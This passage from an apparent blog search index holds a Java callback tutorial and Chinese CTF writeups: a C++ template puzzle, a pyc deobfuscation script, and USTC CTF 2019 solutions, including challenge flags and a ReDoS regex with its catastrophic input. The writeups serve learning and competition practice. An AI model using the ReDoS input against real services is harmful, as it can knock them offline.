printer.print(callback, text); } }).start(); } } Main.java public class Main {//测试类，同步回调 public static void main(String[] args) { People people = new People(); Callback callback = new Callback() { @Override public void printFinished(String msg) { System.out.println(\"打印机告诉我的消息是 ---\u003e \" + msg); } }; System.out.println(\"需要打印的内容是 ---\u003e \" + \"打印一份简历\"); people.goToPrintSyn(callback, \"打印一份简历\"); System.out.println(\"我在等待 打印机 给我反馈\"); } } Main.java public class Main {//异步回调 public static void main(String[] args) { People people = new People(); Callback callback = new Callback() { @Override public void printFinished(String msg) { System.out.println(\"打印机告诉我的消息是 ---\u003e \" + msg); } }; System.out.println(\"需要打印的内容是 ---\u003e \" + \"打印一份简历\"); people.goToPrintASyn(callback, \"打印一份简历\"); System.out.println(\"我在等待 打印机 给我反馈\"); } } android中实现回调 private OnCampaignClickListener mListener; //定义接口，不考虑方法实现，方法实现由调用者去考虑 public interface OnCampaignClickListener{ void onClick(View view,Campaign campaign); } //暴露一个方法给调用者来注册接口回调，通过接口来获得回调者对接口方法的实现 public void setOnCampaignClickListener(OnCampaignClickListener listener){ this.mListener = listener; } imageViewBig.setOnClickListener(this); imageViewSmallTop.setOnClickListener(this); imageViewSmallBottom.setOnClickListener(this); //对这些组件的点击事件设置点击效果 @Override public void onClick( View v) { anim(v); } //**为三个组件添加点击事件，调用接口中的方法，待需要回调时，会有具体的实现** private void anim(final View v){ //通过ObjectAnimator设置动画属性 ObjectAnimator animator = ObjectAnimator.ofFloat(v,\"rotationX\",0.0F,360.0F) .setDuration(200); animator.addListener(new AnimatorListenerAdapter() { //动画效果结束后回调 @Override public void onAnimationEnd(Animator animation) { super.onAnimationEnd(animation); HomeCampaign homeCampaign = mDatas.get(getLayoutPosition()); if(mListener !=null){ switch (v.getId()){ case R.id.imgview_big: mListener.onClick(v,homeCampaign.getCpOne()); break; case R.id.imgview_small_top: mListener.onClick(v,homeCampaign.getCpTwo()); break; case R.id.imgview_small_bottom: mListener.onClick(v,homeC","date":"2020-02-25","objectID":"/java-1/:3:0","tags":null,"title":"Java 泛型与回调","uri":"/java-1/"},{"categories":["writeup"],"content":"src_leak 题目给了源码如下： #include\u003ciostream\u003e using namespace std; typedef unsigned int uint; template \u003cbool Flag, class MaybeA, class MaybeB\u003e class IfElse; template \u003cclass MaybeA, class MaybeB\u003e class IfElse\u003ctrue, MaybeA, MaybeB\u003e { public: using ResultType = MaybeA; }; template \u003cclass MaybeA, class MaybeB\u003e class IfElse\u003cfalse, MaybeA, MaybeB\u003e { public: using ResultType = MaybeB; }; template \u003cuint N, uint L, uint R\u003e struct func1 { enum { mid = (L + R + 1) / 2 }; using ResultType = typename IfElse\u003c(N \u003c mid * mid), func1\u003cN, L, mid - 1\u003e, func1\u003cN, mid, R\u003e \u003e::ResultType; enum { result = ResultType::result }; }; template \u003cuint N, uint L\u003e struct func1\u003cN, L, L\u003e { enum { result = L }; }; template \u003cuint N\u003e struct _func1 { enum { result = func1\u003cN, 1, N\u003e::result }; }; template\u003csize_t Input\u003e constexpr size_t func2 = (Input % 2) + func2\u003c (Input / 2) \u003e; template\u003c\u003e constexpr size_t func2\u003c0\u003e = 0; template\u003csize_t num\u003e constexpr size_t func3 = num % 2; template\u003cuint n, uint m\u003estruct NEXTN { const static uint value = ((n % m != 0) * n); }; template\u003cuint n, uint m\u003estruct NEXTM { const static uint value = (m * m \u003c= n ? (m + 1) : 0); }; template\u003cuint n, uint m\u003estruct TEST { const static uint value = TEST\u003cNEXTN\u003cn, m\u003e::value, NEXTM\u003cn, m\u003e::value\u003e::value; }; template\u003cuint m\u003estruct TEST\u003c0, m\u003e { const static uint value = 0; }; template\u003cuint n\u003estruct TEST\u003cn, 0\u003e { const static uint value = 1; }; template\u003cuint n\u003estruct func4 { const static uint value = TEST\u003cn, 2\u003e::value; }; template\u003c\u003estruct func4\u003c1\u003e { const static uint value = 0; }; template\u003c\u003estruct func4\u003c2\u003e { const static uint value = 1; }; int main(int argc, char**argv) { //input 5 uint numbers ,x1,x2,x3,x4,x5 //the sum of them should be MIN cout \u003c\u003c func3\u003c func2\u003cx1\u003e \u003e \u003c\u003c endl; cout \u003c\u003c func3\u003c func2\u003cx2\u003e \u003e \u003c\u003c endl; cout \u003c\u003c func3\u003c func2\u003cx3\u003e \u003e \u003c\u003c endl; cout \u003c\u003c func3\u003c func2\u003cx4\u003e \u003e \u003c\u003c endl; cout \u003c\u003c func3\u003c func2\u003cx5\u003e \u003e \u003c\u003c endl; // output: 1 1 1 1 1 cout \u003c\u003c _func1\u003cx1\u003e::result \u003c\u003c endl; cout \u003c\u003c _func1\u003cx2\u003e::result \u003c\u003c endl; cout \u003c\u003c _func1\u003cx3\u003e::result \u003c\u003c endl; cout \u003c\u003c _func1\u003cx4\u003e::result \u003c\u003c endl; cout \u003c\u003c _func1\u003cx5\u003e::result \u003c\u003c endl; //output: 963 4396 6666 1999 3141 //how many \"1\" will func4\u003c1\u003e,func4\u003c2\u003e,fun4\u003c3\u003e......fun4\u003c10000\u003e ::value return? x6 = count; // your flag is flag{x1-x2-x3-x4-x5-x6} // if x1=1,x2=2,x3=3,x4=4,x5=5,x6=6 // flag is flag{1-2-3-4-5-6} return 0; } 模板: https://zh.cppreference.com/w/cpp/language/template_specialization 模板特化： https://blog.csdn.net/gatieme/article/details/50953564 _func1求参数的平方根，向下取整(二分法) func2求参数的二进制数中1的个数 func3求参数的奇偶 func4求是否位素数(sqrt(n)以下的数是否是n的参数) 所以函数要求: x1-x5都是奇数，而且平方根分别为963 4396 6666 1999 3141, x6是10000以内素数的个数。 ","date":"2019-12-18","objectID":"/2019zgc/:1:0","tags":null,"title":"2019-中关村网络与信息安全领域专项赛","uri":"/2019zgc/"},{"categories":["writeup"],"content":"pyc 使用010Editor的相应模板打开，并修改pyc.bt中的以下部分: enum \u003cuint16\u003e MagicValue { PY_24a0 = 62041, PY_24a3 = 62051, PY_24b1 = 62061, PY_25a0_1 = 62071, PY_25a0_2 = 62081, PY_25a0_3 = 62091, PY_25a0_4 = 62092, PY_25b3_1 = 62101, PY_25b3_2 = 62111, PY_25c1 = 62121, PY_25c2 = 62131, PY_26a0 = 62151, PY_26a1 = 62161, PY_27a0_1 = 62171, PY_27a0_2 = 62181, PY_27a0_a = 62211, }; Magic Number(四字节) 前两个字节是可变的，它和编译 python 文件的 python 版本有关，接下来两个字节是固定的 0D0A，转换成 ASC 码就是 \\r\\n mtime(四字节) 这个字段表示该 pyc 文件的编译日期，用 unix 时间戳来表示 PyCodeObject //Include/code.h typedef struct { PyObject_HEAD // 用它来表示一个 PyCodeObject的开始 int co_argcount; /* #arguments, except *args */ int co_nlocals; /* #local variables */ int co_stacksize; /* #entries needed for evaluation stack */ int co_flags; /* CO_..., see below */ PyObject *co_code; /* instruction opcodes */ PyObject *co_consts; /* list (constants used) */ PyObject *co_names; /* list of strings (names used) */ PyObject *co_varnames; /* tuple of strings (local variable names) */ PyObject *co_freevars; /* tuple of strings (free variable names) */ PyObject *co_cellvars; /* tuple of strings (cell variable names) */ /* The rest doesn't count for hash/cmp */ PyObject *co_filename; /* string (where it was loaded from) */ PyObject *co_name; /* string (name, for reference) */ int co_firstlineno; /* first source line number */ PyObject *co_lnotab; /* string (encoding addr\u003c-\u003elineno mapping) See Objects/lnotab_notes.txt for details. */ void *co_zombieframe; /* for optimization only (see frameobject.c) */ PyObject *co_weakreflist; /* to support weakrefs to code objects */ } PyCodeObject; 各个字段的含义如下: argcount 参数个数 nlocals 局部变量个数 stacksize 栈空间大小 flags N/A TYPE_STRING 表示字节码开始 r_long n 字节码的数量 struct Instruction inst[] 字节码序列 PyObject 的序列化在 python/marshal.c 内实现，一般是先写入一个 byte 来标识此 PyObject 的类型，每种 PyObject 对应的类型也在 Python/marshal.c 内定义： #define TYPE_NULL '0' #define TYPE_NONE 'N' #define TYPE_FALSE 'F' #define TYPE_TRUE 'T' #define TYPE_STOPITER 'S' #define TYPE_ELLIPSIS '.' #define TYPE_INT 'i' #define TYPE_INT64 'I' #define TYPE_FLOAT 'f' #define TYPE_BINARY_FLOAT 'g' #define TYPE_COMPLEX 'x' #define TYPE_BINARY_COMPLEX 'y' #define TYPE_LONG 'l' #define TYPE_STRING 's' #define TYPE_INTERNED 't' #define TYPE_STRINGREF 'R' #define TYPE_TUPLE '(' #define TYPE_LIST '[' #define TYPE_DICT '{' #define TYPE_CODE 'c' #define TYPE_UNICODE 'u' #define TYPE_UNKNOWN '?' #define TYPE_SET '\u003c' #define TYPE_FROZENSET '\u003e' 如图type等于99就是TYPE_CODE类型,PyCodeObject 的第一个部分肯定是 TYPE_CODE，表示字节码区块 使用dis模块转化为反编译字节码区块部分: import dis class read(): def __init__(self, filename, mode): # print filename, mode self.file = open(filename, mode) def read(self, num): return (self.file).read(num) pyc = read(\"test.pyc\", \"rb\") pyc.read(30) target = pyc.read(0x31) # print bytes(target) dis.dis(target) 结果： 0 LOAD_CONST 0 (0) # 读取常量列表中的 0 号常量 3 MAKE_FUNCTION 0 # 制作一个函数 6 STORE_NAME 0 (0) # 函数命名为字符串列表中的 0 号 9 LOAD_CONST 1 (1) 12 MAKE_FUNCTION 0 15 STORE_NAME 1 (1) 18 LOAD_NAME 0 (0) # 取出函数 1 21 CALL_FUNCTION 0 # 调用 24 STORE_NAME 2 (2) # 存储返回值 27 LOAD_NAME 1 (1) 30 CALL_FUNCTION 0 33 STORE_NAME 3 (3) 36 LOAD_NAME 2 (2) # 取出两个返回值 39 LOAD_NAME 3 (3) 42 BINARY_ADD # 相加 43 PRINT_ITEM # 打印结果 44 PRINT_NEWLINE 45 LOAD_CONST 2 (2) 48 RETURN_VALUE 混淆的一般思路: uncompyle 的工作原理和一般的反编译器类似，它会尽力去匹配每一条指令，尝试将所有指令都覆盖到，但是在解析上面的代码时，碰到 load 不存在的常量时就会出错，无法继续反编译。 所有的指令可以分为两类，不需要参数和需要参数的，Python字节码在设计的时候故意把没有参数的指令分配在了对应编号的低位，高位都是有参数的，以Include/opcode.h中的HAVE_ARGUMENT分界。他们的在二进制级别上的组织是这样的： [指令] 不需要参数的指令只占用一个字节 [指令] [参数低字节] [参数高字节] 需要参数的指令占用三个字节，一个字节指令，两个字节参数 本题中经过混淆的字节码: \u003e\u003e\u003e list(map(ord,code.co_code[:9])) [113, 158, 2, 136, 104, 110, 126, 58, 140] \u003e\u003e\u003e dis.opname[113] 'JUMP_ABSOLUTE' \u003e\u003e\u003e 2*256+158 670 \u003e\u003e\u003e dis.opname[136] 'LOAD_DEREF' \u003e\u003e\u003e 110*256+104 28264 从上面可以看到，第一条指令是JUMP_ABSOLTE 670，这个offset的指令是真实存在的，所以指令合法。但是第二条指令应该是LOAD_DEREF 28264，这个index的对象并不存在，在dis尝试解析的时候就会崩溃。 实际上因为之前的跳转指令所以第二条的非法指令并不会被真实执行到，所以pyc文件作者是故意加入不影响执行的非法指令触发分析软件崩溃，阻碍对该pyc文件的分析。 ","date":"2019-12-18","objectID":"/2019zgc/:2:0","tags":null,"title":"2019-中关村网络与信息安全领域专项赛","uri":"/2019zgc/"},{"categories":["writeup"],"content":"去混淆 用Apeng师傅的方法可以去掉混淆 # python2 disasm_anti.py py.pyc import dis, marshal, struct, sys, time, types from opcode import * def ana_branch(code, i, hits): if i \u003e len(code): return if i in hits: return else: hits.append(i) c = code[i] op = ord(c) if op == 111 or op == 112 or op == 114 or op == 115 or op == 120 or op == 93: oparg = ord(code[i+1]) + ord(code[i+2])*256 if op == 120 or op == 93: oparg += i oparg += 3 ana_branch(code, oparg, hits) ana_branch(code, i+3, hits) elif op == 110: oparg = ord(code[i+1]) + ord(code[i+2])*256 ana_branch(code, i + oparg + 3, hits) elif op == 113: oparg = ord(code[i+1]) + ord(code[i+2])*256 ana_branch(code, oparg, hits) else: if op\u003e=HAVE_ARGUMENT: ana_branch(code, i+3, hits) else: ana_branch(code, i+1, hits) def findlinestarts(code): \"\"\"Find the offsets in a byte code which are start of lines in the source. Generate pairs (offset, lineno) as described in Python/compile.c. \"\"\" byte_increments = [ord(c) for c in code.co_lnotab[0::2]] line_increments = [ord(c) for c in code.co_lnotab[1::2]] lastlineno = None lineno = code.co_firstlineno addr = 0 for byte_incr, line_incr in zip(byte_increments, line_increments): if byte_incr: if lineno != lastlineno: yield (addr, lineno) lastlineno = lineno addr += byte_incr lineno += line_incr if lineno != lastlineno: yield (addr, lineno) def findhits(code): hits = [] n = len(code) i = 0 ana_branch(code, i, hits) hits.sort() return hits def anti_findlabels(code): \"\"\"Detect all offsets in a byte code which are jump targets. Return the list of offsets. \"\"\" hits = findhits(code) labels = [] n = len(code) i = 0 while i \u003c n: if i not in hits: i+=1 continue c = code[i] op = ord(c) i = i+1 if op \u003e= HAVE_ARGUMENT: oparg = ord(code[i]) + ord(code[i+1])*256 i = i+2 label = -1 if op in hasjrel: label = i+oparg elif op in hasjabs: label = oparg if label \u003e= 0: if label not in labels: labels.append(label) return labels def dis_anti_obf(co, lasti = -1): \"\"\"Disassemble a code object, anti obf\"\"\" anti_code = \"\" code = co.co_code hits = findhits(code) labels = anti_findlabels(code) linestarts = dict(findlinestarts(co)) n = len(code) i = 0 i = 0 extended_arg = 0 free = None while i \u003c n: if i not in hits: i+=1 anti_code+=\"\\x09\" continue c = code[i] op = ord(c) if i in linestarts: if i \u003e 0: print print \"%3d\" % linestarts[i], else: print ' ', if i == lasti: print '--\u003e', else: print ' ', if i in labels: print '\u003e\u003e', else: print ' ', print repr(i).rjust(4), print opname[op].ljust(20), anti_code += code[i] i = i+1 if op \u003e= HAVE_ARGUMENT: oparg = ord(code[i]) + ord(code[i+1])*256 + extended_arg extended_arg = 0 anti_code+=code[i] anti_code+=code[i+1] i = i+2 if op == EXTENDED_ARG: extended_arg = oparg*65536L print repr(oparg).rjust(5), if op in hasconst: print '(' + repr(co.co_consts[oparg]) + ')', elif op in hasname: print '(' + co.co_names[oparg] + ')', elif op in hasjrel: print '(to ' + repr(i + oparg) + ')', elif op in haslocal: print '(' + co.co_varnames[oparg] + ')', elif op in hascompare: print '(' + cmp_op[oparg] + ')', elif op in hasfree: if free is None: free = co.co_cellvars + co.co_freevars print '(' + free[oparg] + ')', print print \"patch code:\" print(anti_code.encode(\"hex\")) def show_file(fname): f = open(fname, \"rb\") magic = f.read(4) moddate = f.read(4) modtime = time.asctime(time.localtime(struct.unpack('L', moddate)[0])) print \"magic %s\" % (magic.encode('hex')) print \"moddate %s(%s)\" % (moddate.encode('hex'), modtime) code = marshal.load(f) show_code(code) def show_code(code, indent=''): print \"%scode\" % indent indent += ' ' print \"%sargcount %d\" % (indent, code.co_argcount) print \"%snlocals %d\" % (indent, code.co_nlocals) print \"%sstacksize %d\" % (indent, code.co_stacksize) print \"%sflags %04x\" % (indent, code.co_flags) show_hex(\"code\", code.co_code, indent=indent) dis_anti_obf(code) print \"%sconsts\" % indent for const in code.co_consts: if type(const) == types.CodeType: show_code(const, indent+' ') else: print \" %s%r\" % (indent, const) print \"%snames %r\" % (indent, code.co","date":"2019-12-18","objectID":"/2019zgc/:3:0","tags":null,"title":"2019-中关村网络与信息安全领域专项赛","uri":"/2019zgc/"},{"categories":["writeup"],"content":"NOP指令去除与块的合并 fxti师傅给了一个工具: https://github.com/extremecoders-re/bytecode_simplifier 利用这个工具可以去除上面去混淆以后生成的全是NOP指令的块，以及合并一些块 完成之后使用uncompyle6可以反汇编一下(反编译还是会失败) L. 1 0 LOAD_CONST 2694209818L 3 STORE_FAST 0 'DIVIDER' 6 JUMP_FORWARD 0 'to 9' 9_0 COME_FROM 6 '6' 9 LOAD_CONST 4130330538L L. 3 12 LOAD_FAST 0 'DIVIDER' 15 COMPARE_OP 2 == 18 POP_JUMP_IF_TRUE 366 'to 366' L. 9 21 LOAD_CONST 3168701571L 24 LOAD_FAST 0 'DIVIDER' 27 COMPARE_OP 2 == L. 14 30 POP_JUMP_IF_TRUE 345 'to 345' 33 LOAD_CONST 3715947653L 36 LOAD_FAST 0 'DIVIDER' L. 17 39 COMPARE_OP 2 == 42 POP_JUMP_IF_TRUE 324 'to 324' 45 LOAD_CONST 2694209818L L. 20 48 LOAD_FAST 0 'DIVIDER' 51 COMPARE_OP 2 == 54 POP_JUMP_IF_TRUE 306 'to 306' L. 38 57 LOAD_CONST 651787064 60 LOAD_FAST 0 'DIVIDER' 63 COMPARE_OP 2 == 66 POP_JUMP_IF_TRUE 285 'to 285' 69 LOAD_CONST 3521152606L 72 LOAD_FAST 0 'DIVIDER' 75 COMPARE_OP 2 == 78 POP_JUMP_IF_TRUE 264 'to 264' 81 LOAD_CONST 2730391645L 84 LOAD_FAST 0 'DIVIDER' 87 COMPARE_OP 2 == 90 POP_JUMP_IF_TRUE 246 'to 246' 93 LOAD_CONST 4084147187L 96 LOAD_FAST 0 'DIVIDER' 99 COMPARE_OP 2 == 102 POP_JUMP_IF_TRUE 222 'to 222' 105 LOAD_CONST 1860581437 108 LOAD_FAST 0 'DIVIDER' 111 COMPARE_OP 2 == 114 POP_JUMP_IF_TRUE 204 'to 204' 117 LOAD_CONST 3816944324L 120 LOAD_FAST 0 'DIVIDER' 123 COMPARE_OP 2 == 126 POP_JUMP_IF_TRUE 203 'to 203' 129 LOAD_CONST 394367122 132 LOAD_FAST 0 'DIVIDER' 135 COMPARE_OP 2 == 138 POP_JUMP_IF_TRUE 181 'to 181' 141 LOAD_CONST 1627830889 144 LOAD_FAST 0 'DIVIDER' 147 COMPARE_OP 2 == 150 POP_JUMP_IF_TRUE 157 'to 157' 153 LOAD_CONST None 156 RETURN_END_IF 157_0 COME_FROM 150 '150' 157 STORE_NAME 0 'sys' 160 LOAD_CODE \u003ccode_object str2hex\u003e 163 MAKE_FUNCTION_0 0 None 166 STORE_NAME 1 'str2hex' 169 LOAD_CODE \u003ccode_object hex2str\u003e 172 LOAD_CONST 3715947653L 175 STORE_FAST 0 'DIVIDER' 178 JUMP_BACK 9 'to 9' 181 LOAD_NAME 10 'flag' 184 CALL_FUNCTION_1 1 None 187 CALL_FUNCTION_1 1 None 190 POP_TOP 191 LOAD_CONST None 194 LOAD_CONST 3816944324L 197 STORE_FAST 0 'DIVIDER' 200 JUMP_BACK 9 'to 9' 203 RETURN_END_IF 204_0 COME_FROM 114 '114' 204 LOAD_CONST 97 207 LOAD_CONST 103 210 LOAD_CONST 58 213 LOAD_CONST 2730391645L 216 STORE_FAST 0 'DIVIDER' 219 JUMP_BACK 9 'to 9' 222 LOAD_ATTR 6 'stdout' 225 LOAD_ATTR 7 'write' 228 LOAD_NAME 2 'hex2str' 231 LOAD_CONST 102 234 LOAD_CONST 108 237 LOAD_CONST 1860581437 240 STORE_FAST 0 'DIVIDER' 243 JUMP_BACK 9 'to 9' 246 BUILD_LIST_5 5 249 CALL_FUNCTION_1 1 None 252 CALL_FUNCTION_1 1 None 255 LOAD_CONST 4130330538L 258 STORE_FAST 0 'DIVIDER' 261 JUMP_BACK 9 'to 9' 264 CALL_FUNCTION_1 1 None 267 STORE_NAME 10 'flag' 270 LOAD_NAME 5 'count' 273 LOAD_NAME 1 'str2hex' 276 LOAD_CONST 394367122 279 STORE_FAST 0 'DIVIDER' 282 JUMP_BACK 9 'to 9' 285 STORE_NAME 3 'p_s' 288 LOAD_CODE \u003ccode_object p_f\u003e 291 MAKE_FUNCTION_0 0 None 294 STORE_NAME 4 'p_f' 297 LOAD_CONST 3168701571L 300 STORE_FAST 0 'DIVIDER' 303 JUMP_BACK 9 'to 9' 306 LOAD_CONST -1 309 LOAD_CONST None 312 IMPORT_NAME 0 'sys' 315 LOAD_CONST 1627830889 318 STORE_FAST 0 'DIVIDER' 321 JUMP_BACK 9 'to 9' 324 MAKE_FUNCTION_0 0 None 327 STORE_NAME 2 'hex2str' 330 LOAD_CODE \u003ccode_object p_s\u003e 333 MAKE_FUNCTION_0 0 None 336 LOAD_CONST 651787064 339 STORE_FAST 0 'DIVIDER' 342 JUMP_BACK 9 'to 9' 345 LOAD_CODE \u003ccode_object count\u003e 348 MAKE_FUNCTION_0 0 None 351 STORE_NAME 5 'count' 354 LOAD_NAME 0 'sys' 357 LOAD_CONST 4084147187L 360 STORE_FAST 0 'DIVIDER' 363 JUMP_BACK 9 'to 9' 366 POP_TOP 367 LOAD_NAME 0 'sys' 370 LOAD_ATTR 8 'stdin' 373 LOAD_ATTR 9 'read' 376 LOAD_CONST 38 379 LOAD_CONST 3521152606L 382 STORE_FAST 0 'DIVIDER' 385 JUMP_BACK 9 'to 9' 然后我暂时只会看这个字节码，fxti师傅那个自己去混淆的方案没开源，我打算自己仔细研究一下这个反编译的代码，看能不能按照那个思路复现一下。 ","date":"2019-12-18","objectID":"/2019zgc/:4:0","tags":null,"title":"2019-中关村网络与信息安全领域专项赛","uri":"/2019zgc/"},{"categories":["writeup"],"content":"参考链接 https://apeng.fun/2019/08/16/2019zgc_quals/ PYC 文件的简单分析 PYC文件格式分析 Python字节码解混淆 Python字节码解混淆之反控制流扁平化 ","date":"2019-12-18","objectID":"/2019zgc/:5:0","tags":null,"title":"2019-中关村网络与信息安全领域专项赛","uri":"/2019zgc/"},{"categories":["writeup"],"content":"USTC CTF 2019 看群里发了这个新生赛的宣传，抽空做了一下，有几个题好有趣呀，出题人应该有一颗有趣的灵魂哈哈哈哈。这个主要是一个记录，选择的基本上是我没做出来的题目，看别人的WP写了一份。希望日后做题能有用可以来参考。 ","date":"2019-10-31","objectID":"/ustc2019/:1:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"宇宙终极问题 有一个定理：每个整数都可以分解成4个数平方和的形式。(Lagrange’s four-square theorem) 四立方和分解： https://www.alpertron.com.ar/FCUBES.HTM 四平方和分解： https://www.alpertron.com.ar/FSQUARES.HTM 在别人的WP上找到了一个代码版本求四平方和的脚本，这里记录一下。 import gmpy2 from Crypto.Util.number import getPrime, getRandomInteger def TonelliShanks(p, a): # TonelliShanks算法 if pow(a, (p - 1) // 2, p) != 1: return -1 q = p - 1 m = 0 while q % 2 == 0: q //= 2 m += 1 z = 0 while pow(z, (p - 1) // 2, p) != p - 1: z = getRandomInteger(10) c = pow(z, q, p) t = pow(a, q, p) r = pow(a, (q + 1) // 2, p) while m \u003e 1: tmp = pow(t, 1 \u003c\u003c (m - 2), p) if tmp != 1: r = r * c % p t = t * (c * c % p) % p c = c * c % p m -= 1 return r def find_small_m(x, y, p): x2y2 = x * x + y * y m = x2y2 // p assert 0 == (x2y2 % p) and 0 == (x2y2 % m) while 1 \u003c m: u, v = x % m, y % m if u * 2 \u003e m: u -= m if v * 2 \u003e m: v -= m u2v2 = u * u + v * v mm = u2v2 // m assert 0 == (u2v2 % m) and 0 \u003c mm \u003c m x, y = (u * x + v * y) // m, (u * y - v * x) // m x2y2 = x * x + y * y m = x2y2 // p assert 0 == (x2y2 % p) and 0 == (x2y2 % m) return x, y, m def get2square(r): # 这里还可以求两个数的平方和 if r == 2: return 1, 1 assert 1 == r % 4 and gmpy2.is_prime(r) x0 = TonelliShanks(r, r - 1) assert r - 1 == pow(x0, 2, r) k, l, m = find_small_m(x0, 1, r) assert k * k + l * l == m * r assert 1 == m return k, l def get4square(n): print(\"n =\", n) while True: i = getRandomInteger(100) j = getRandomInteger(100) j ^= (i ^ j) \u0026 0x1 r = n - i * i - j * j if 1 == r % 4 and gmpy2.is_prime(r): break print(\"r =\", r) k, l = get2square(r) assert i * i + j * j + k * k + l * l == n print(\"i =\", i) print(\"j =\", j) print(\"k =\", k) print(\"l =\", l) return i, j, k, l if __name__ == '__main__': n = getPrime(256) * getPrime(256) print(get4square(n)) 还有一问是随机数的平方和分解问题。将一个随机数分解成两个素数的平方和。 定理：整数n能分解为两个整数的平方和的充要条件是，n的质因数分解不存在(4k+3)型质数的奇数次方。 这里n的分解得到的质数都是4k+1的形式。 定理： https://en.wikipedia.org/wiki/Brahmagupta%E2%80%93Fibonacci_identity def get2square_list(n, primes): assert list == type(primes) check_product = 1 for p in primes: assert 2 == p or (1 == p % 4 and gmpy2.is_prime(p)) check_product *= p assert check_product == n u, v = 1, 0 for p in primes: x, y = get2square(p) u, v = u * x + v * y, u * y - v * x assert u * u + v * v == n return u, v ","date":"2019-10-31","objectID":"/ustc2019/:2:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"Happy LUG 基础太差了，考点是DNS。 题目说这个域名无法通过浏览器访问，也就是这个域名没有指向任何 IP 地址。实际上一个域名除了可以指向一个或多个 IP 地址（A 或 AAAA 记录）之外还可以包含其他信息，例如指向另一个域名（CNAME 记录），指示接收邮件的服务器（MX 记录），或者提供任意字符串（TXT 记录）。最后一个就是这道题的第二个知识点，域名 xn–g28h.hack.ustclug.org. 有一个 TXT 记录，其中就是 flag。查询 DNS 记录有很多种方式，例如网上搜一个查询服务或者使用 nslookup 等命令行工具，总之查出这个 TXT 记录就对了。 用DNS查询TXT记录的方法是：nslookup -q=TXT yourdomain.com λ nslookup -q=TXT xn--g28h.hack.ustclug.org 服务器: UnKnown Address: 10.3.9.5 非权威应答: xn--g28h.hack.ustclug.org text = \"flag{DN5_C4N_H4VE_em0ji_haha}\" ","date":"2019-10-31","objectID":"/ustc2019/:3:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"正则验证器 这里用了ReDos这个知识点，是我没见过的知识点…是我太菜了hhh https://en.wikipedia.org/wiki/ReDoS https://www.anquanke.com/post/id/177100 Regex: (a*)*$ String: aaaaaaaaaaaaaaaaaaaaaaab 上面这个正则由于失败时回溯的存在，每增加一个 a 就会使匹配时间翻一倍 ","date":"2019-10-31","objectID":"/ustc2019/:4:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"驴啃计算器 是一道数学题，知识点是：给定实数x，一步操作可选择将其变为sin(x),cos(x),tan(x),arcsin(x),arccos(x),arctan(x)，初始时x=0，求证对于任意的正有理数q，可经过有限次操作后使x=q。 http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html https://nbviewer.jupyter.org/github/ustclug/hackergame2019-writeups/blob/master/official/%E9%A9%B4%E5%95%83%E8%AE%A1%E7%AE%97%E5%99%A8/calc.ipynb (tips: https://nbviewer.jupyter.org/ 可以打开任意的在线ipynb文档) from __future__ import division from pwn import * from numpy import * from fractions import Fraction calcList = [] def genFraction(num,n=20): f = Fraction(num) a = f.numerator b = f.denominator a = a*a b = b*b for i in range(n): result = a//b a = a - result*b #print a,b a,b = b,a #print a,b ''' if result == 1: break ''' #if result \u003e 5000: # break yield result if b == 0: break def f(x): global calcList calcList += [\"atan\",\"sin\",\"acos\",\"tan\"] return tan(arccos(sin(arctan(x)))) def g(x): global calcList calcList += [\"atan\",\"cos\"] return f(cos(arctan(x))) def test(aim): global calcList #aim = log(aim) #aim = 42.79781263758425 #tan(72.35711075569202) aim = deg2rad(aim) x = 0 fList = [] for i in genFraction(aim): fList.append(i) print fList for i in range(len(fList)): a = fList.pop() for j in range(a): x = g(x) calcList += [\"1/x\"] x = 1/x calcList += [\"1/x\"] x = 1/x calcList += [\"R2D\"] print \"aim = %f\" % rad2deg(aim) print \"x = %f\" % (rad2deg(x)) #print \"p = %f\" % ((x*x)) return \",\".join(calcList) import json import requests host = \"http://202.38.93.241:10024\" def solve(x): return 'sin,cos,x^2' or 'magic' def test2(): with requests.session() as sess: r = sess.get(host + '/challenges') X = json.loads(r.text)[\"msg\"] print(X) data = { \"a1\": test(X[0]), \"a2\": test(X[1]), \"a3\": test(X[2]) } r = sess.post(host + \"/submit\", data=data) resp = json.loads(r.text) print(resp[\"msg\"]) test2() ","date":"2019-10-31","objectID":"/ustc2019/:5:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"天书残篇 是道简单的逆向题，用了Witespace这个语言。在线反汇编器：https://vii5ard.github.io/whitespace/ 这里有各种奇奇怪怪的语言：https://juejin.im/post/5b02745b6fb9a07aa5429a76 顺便有WP提了一下Ook： https://www.cnblogs.com/WangAoBo/p/6373318.html 在线解密：https://www.splitbrain.org/services/ook ","date":"2019-10-31","objectID":"/ustc2019/:6:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"我想要个家 是我卡住的题… chroot… 我没想过用RE的方式解来着–idagolang-helper还原符号，然后用patch的方法。试一下。 ","date":"2019-10-31","objectID":"/ustc2019/:7:0","tags":null,"title":"USTC CTF 2019","uri":"/ustc2019/"},{"categories":["writeup"],"content":"十次方根 x = 130095999494467643631574289251374479743427759332282644620931023932981730612064829262332840253969261363881910701276769455728130421459878658660627330362688856751252524519341435317968272275310598639991033512763704530123231772642623291899534454658707761230166809620539187116816778418242273580873637781313957589597 y = 116513882455567447431772208851676203256471727099349255694179213039239989833646726805040167642952589899809273716764673737423792812107737304956679717082391151505476360762847773608327055926832394948293052633869637754201186227370594688119795413400655007893009882742908697688490841023621108562593724732469462968731 z = 88688615046438957657148589794574470139777919686383514327296565433247300792803913489977671293854830459385807133302995575774658605472491904258624914486448276269854207404533062581134557448023142028865220726281791025833570337140263511960407206818858439353134327592503945131371190285416230131136007578355799517986306208039490339159501009668785839201465041101739825050371023956782364610889969860432267781626941824596468923354157981771773589236462813563647577651117020694251283103175874783965004467136515096081442018965974870665038880840823708377340101510978112755669470752689525778937276250835072011344062132449232775717960070624563850487919381138228636278647776184490240264110748648486121139328569423969642059474027527737521891542567351630545570488901368570734520954996585774666946913854038917494322793749823245652065062604226133920469926888309742466030087045251385865707151307850662127591419171619721200858496299127088429333831383287417361021420824398501423875648199373623572614151830871182111045650469239575676312393555191890749537174702485617397506191658938798937462708198240714491454507874141432982611857838173469612147092460359775924447976521509874765598726655964369735759375793871985156532139719500175158914354647101621378769238233 n ** 